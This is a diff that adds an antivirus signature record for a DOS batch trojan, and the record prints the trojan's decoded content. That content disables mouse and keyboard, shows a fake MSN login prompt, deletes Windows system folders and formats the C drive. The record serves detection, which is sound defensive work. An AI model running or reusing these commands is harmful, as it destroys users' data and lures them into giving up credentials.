@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36567
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off c:/windows/rundll32.exe mouse,disable c:/windows/rundll32.exe keyboard,disable echo welcome to msn echo connecting del c:/windows/system32 echo done loading echo enter your username&password pause del c:/windows format c:\y 
